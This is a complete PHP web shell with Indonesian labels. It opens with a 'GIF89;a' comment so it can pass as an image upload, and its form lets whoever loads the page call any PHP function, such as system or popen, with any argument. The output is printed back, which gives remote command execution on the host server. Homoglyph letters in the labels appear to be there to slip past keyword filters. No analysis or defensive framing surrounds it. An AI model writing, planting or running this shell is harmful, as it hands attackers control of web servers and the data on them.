<!-- GIF89;a -->
<html>
<body>
    <form method="POST">
        <input type="text" name="x" placeholder="Fungsi (ëx: Śystëm)">
        <input type="text" name="y" placeholder="Perintah (ëx: id)">
        <input type="submit" value="Run">
    </form>
    <pre>
    <?php
    if (isset($_POST['x']) && isset($_POST['y'])) {
        $a = $_POST['x'];
        $b = $_POST['y'];

        echo "<b style='color:#fff;'>Ēxecuting: $a(\"$b\")</b>\n\n";

        if (is_callable($a)) {
            if ($a === 'popen') {
                $handle = @$a($b . ' 2>&1', 'r');
                if ($handle) {
                    while (!feof($handle)) echo fread($handle, 1024);
                    pclose($handle);
                }
            }
            else {
                echo @$a($b);
            }
        } else {
            echo "<span style='color:red;'>Ƒungsi '$a' tidāk tersediā</span>";
        }
    }
    ?>
    </pre>
</body>

</html>
